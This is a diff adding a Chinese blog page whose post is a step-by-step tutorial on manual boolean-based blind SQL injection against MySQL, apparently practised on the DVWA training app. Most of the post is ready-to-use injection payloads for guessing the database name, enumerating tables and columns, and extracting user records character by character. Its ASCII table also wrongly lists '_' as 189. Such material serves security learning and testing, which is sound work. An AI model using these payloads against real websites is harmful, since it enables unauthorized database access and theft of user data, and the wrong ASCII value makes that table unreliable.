@@ -1,0 +1,427 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>xssong17</title>
+<meta name="description" content="我等着，等着你" />
+<link rel="shortcut icon" href="https://xssong17.github.io/favicon.ico?v=1730294755423">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://xssong17.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://xssong17.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://xssong17.github.io/images/avatar.png?v=1730294755423" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">xssong17</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#mysql%E6%89%8B%E6%B3%A8%E4%B9%8B%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8">MySQL手注之布尔型盲注</a>
+<ul>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0">常见函数</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B">注入流程</a>
+<ul>
+<li><a href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B">判断注入类型</a></li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">猜解数据库名</a>
+<ul>
+<li><a href="#%E7%8C%9C%E9%95%BF%E5%BA%A6">猜长度</a></li>
+<li><a href="#%E4%BA%8C%E5%88%86%E6%B3%95%E9%80%90%E5%AD%97%E7%8C%9C%E8%A7%A3">二分法逐字猜解</a></li>
+</ul>
+</li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D">猜解表名</a>
+<ul>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8F">猜解表的数量</a></li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E7%9A%84%E9%95%BF%E5%BA%A6">猜解表的长度</a>
+<ul>
+<li><a href="#%E7%8C%9C%E7%AC%AC1%E4%B8%AA%E8%A1%A8%E7%9A%84%E9%95%BF%E5%BA%A6">猜第1个表的长度</a></li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E7%AC%ACn%E4%B8%AA%E8%A1%A8%E7%9A%84%E9%95%BF%E5%BA%A6">猜解第n个表的长度</a></li>
+</ul>
+</li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E7%9A%84%E5%90%8D%E5%AD%97">猜解表的名字</a>
+<ul>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E7%AC%AC1%E4%B8%AA%E8%A1%A8%E7%9A%84%E5%90%8D%E5%AD%97">猜解第1个表的名字</a></li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E7%AC%ACn%E4%B8%AA%E8%A1%A8%E7%9A%84%E5%90%8D%E5%AD%97">猜解第n个表的名字</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5">猜解字段</a>
+<ul>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F">猜解字段数量</a></li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6">猜解字段长度</a>
+<ul>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E7%AC%AC1%E4%B8%AA%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6">猜解第1个字段长度</a></li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E7%AC%ACn%E4%B8%AA%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6">猜解第n个字段长度</a></li>
+</ul>
+</li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D">猜解字段名</a>
+<ul>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E7%AC%AC1%E4%B8%AA%E5%AD%97%E6%AE%B5%E5%90%8D">猜解第1个字段名</a></li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E7%AC%ACn%E4%B8%AA%E5%AD%97%E6%AE%B5%E5%90%8D">猜解第n个字段名</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE">猜解数据</a>
+<ul>
+<li><a href="#%E4%BA%8C%E5%88%86%E6%B3%95%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE">二分法猜解数据</a></li>
+<li><a href="#%E6%9A%B4%E5%8A%9B%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE">暴力猜解数据</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://xssong17.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">MySQL手注之布尔型盲注</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2021-04-15 / 6 min read
+        </div>
+        
+        <div class="post-content yue">
+          <h1 id="mysql手注之布尔型盲注">MySQL手注之布尔型盲注</h1>
+<h2 id="原理">原理</h2>
+<p>1、程序给出了判断</p>
+<p>2、我们能够通过这个信息对相关信息进行判断</p>
+<h2 id="常见函数">常见函数</h2>
+<p>length() 返回字符串的长度</p>
+<p>substr(string, start, offset) ⽤来截取字符串</p>
+<p>ascii() 返回字符的ascii码</p>
+<p>sleep(n) 将程序挂起⼀段时间，n为n秒</p>
+<p>if(expr1,expr2,expr3) 判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句</p>
+<p>limit raw offset 限制数据条数，范围（raw, raw + offset]，（行数，行数+偏移]，<a href="https://www.cnblogs.com/cai170221/p/7122289.html">参考</a></p>
+<h2 id="注入流程">注入流程</h2>
+<h3 id="判断注入类型">判断注入类型</h3>
+<pre><code>1' and 1=1 #
+</code></pre>
+<h3 id="猜解数据库名">猜解数据库名</h3>
+<h4 id="猜长度">猜长度</h4>
+<pre><code>1' and length(database())=1 #
+1' and length(database())=2 #
+1' and length(database())=3 #
+……
+1' and length(database())=n #
+</code></pre>
+<h4 id="二分法逐字猜解">二分法逐字猜解</h4>
+<p>得到长度后就知道这一步需要猜几个字符了</p>
+<p>猜解第1个字符</p>
+<pre><code>1' and ascii(substr(database(),1,1))&gt;97 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼤于97（⼩写字母a的ascii值）；
+1' and ascii(substr(database(),1,1))&lt;122 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于122（⼩写字母z的ascii值）；
+1' and ascii(substr(database(),1,1))&lt;109 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于109（⼩写字母m的ascii值）；
+1' and ascii(substr(database(),1,1))&lt;103 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于103（⼩写字母g的ascii值）；
+1' and ascii(substr(database(),1,1))&lt;100 #，显⽰不存在，说明数据库名的第⼀个字符的ascii值不⼩于100（⼩写字母d的ascii值）；
+1' and ascii(substr(database(),1,1))&gt;100 #，显⽰不存在，说明数据库名的第⼀个字符的ascii值不⼤于100（⼩写字母d的ascii值），所以数据库名的第⼀个字符的ascii值为100，即⼩写字母d。
+</code></pre>
+<p>猜解第2个字符</p>
+<pre><code>1' and ascii(substr(database(),2,1))&gt;97 #，显⽰存在，说明数据库名的第二个字符的ascii值⼤于97（⼩写字母a的ascii值）；
+……
+</code></pre>
+<p>……</p>
+<p>猜解第n个字符</p>
+<pre><code>1' and ascii(substr(database(),n,1))&gt;97
+</code></pre>
+<p>如此可以猜解出具体的数据库名</p>
+<p>MUSQL常见的ascii的值</p>
+<table>
+<thead>
+<tr>
+<th>图形</th>
+<th>ascii</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0 ~ 9</td>
+<td>48 ~ 57</td>
+</tr>
+<tr>
+<td>A ~ Z</td>
+<td>65 ~ 90</td>
+</tr>
+<tr>
+<td>a ~ z</td>
+<td>97 ~ 122</td>
+</tr>
+<tr>
+<td>_</td>
+<td>189</td>
+</tr>
+</tbody>
+</table>
+<p><a href="http://ascii.911cha.com/">ascii查询站点</a></p>
+<h3 id="猜解表名">猜解表名</h3>
+<h4 id="猜解表的数量">猜解表的数量</h4>
+<pre><code>select count(table_name) from information_schema.tables where table_schema=database();# 查看当前数据库的表名长度
+</code></pre>
+<pre><code>1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 #
+1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 #
+……
+1' and (select count(table_name) from information_schema.tables where table_schema=database())=n #
+</code></pre>
+<h4 id="猜解表的长度">猜解表的长度</h4>
+<h5 id="猜第1个表的长度">猜第1个表的长度</h5>
+<pre><code>1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #
+1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 #
+...
+1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=x #=
+</code></pre>
+<h5 id="猜解第n个表的长度">猜解第n个表的长度</h5>
+<pre><code>select table_name from information_schema.tables where table_schema=database();#列出所有表名
+</code></pre>
+<pre><code>select table_name from information_schema.tables where table_schema=database() limit n,1;列出第n+1个表名，
+</code></pre>
+<pre><code>1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit n-1,1),1))=guess_length #
+</code></pre>
+<h4 id="猜解表的名字">猜解表的名字</h4>
+<h5 id="猜解第1个表的名字">猜解第1个表的名字</h5>
+<pre><code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;guess_ascii
+……
+</code></pre>
+<h5 id="猜解第n个表的名字">猜解第n个表的名字</h5>
+<pre><code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit n-1,1),num,1))&gt;guess_ascii
+</code></pre>
+<p>n：第n个表</p>
+<p>num：第n个表名的第num个字符</p>
+<p>guess_ascii：猜想的ascii</p>
+<h3 id="猜解字段">猜解字段</h3>
+<h4 id="猜解字段数量">猜解字段数量</h4>
+<pre><code>1' and (select count(column_name) from information_schema.columns where table_name= 'users')=1 #
+……
+1' and (select count(column_name) from information_schema.columns where table_name= 'users')=n #
+</code></pre>
+<h4 id="猜解字段长度">猜解字段长度</h4>
+<h5 id="猜解第1个字段长度">猜解第1个字段长度</h5>
+<pre><code>1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1 #
+……
+1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=n #
+</code></pre>
+<h5 id="猜解第n个字段长度">猜解第n个字段长度</h5>
+<pre><code>1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit n-1,1),1))=guess_length #
+</code></pre>
+<p>n：第n个字段</p>
+<p>guess_length：猜想长度</p>
+<h4 id="猜解字段名">猜解字段名</h4>
+<h5 id="猜解第1个字段名">猜解第1个字段名</h5>
+<pre><code>1' and ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1,1))&gt;97 #
+……
+1' and ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1,1))&gt;guess_ascii #
+</code></pre>
+<h5 id="猜解第n个字段名">猜解第n个字段名</h5>
+<pre><code>1' and ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit n-1,1),num,1))&gt;guess_ascii #
+</code></pre>
+<p>n：第n个字段</p>
+<p>num：第n个字段名的第num个字符</p>
+<p>guess_ascii：猜想的ascii</p>
+<h3 id="猜解数据">猜解数据</h3>
+<h4 id="二分法猜解数据">二分法猜解数据</h4>
+<pre><code>and ascii(substr((select user from dvwa.users limit 0,1),1,1))&gt;96 #
+······
+and ascii(substr((select user from dvwa.users limit x-1,1),y,1))&gt;96 #
+</code></pre>
+<p>第x个user数据的第y个字符</p>
+<h4 id="暴力猜解数据">暴力猜解数据</h4>
+<pre><code>1' and (select count(*) from users where user = 'admin') = 1 #
+</code></pre>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://xssong17.github.io/tag/wgo_p-85C/">
+            <span class="flex-auto">渗透</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://xssong17.github.io/post/mysql-shou-zhu-zhi-yan-shi-mang-zhu-ji-yu-shi-jian-de-mang-zhu/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  MySQL手注之延时盲注(基于时间的盲注)
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://xssong17.github.io/post/mysqlzhu-zhi-bao-cuo-zhu/">
+                <h3 class="post-title">
+                  MySQL⼿注之报错注⼊
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://xssong17.github.io/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
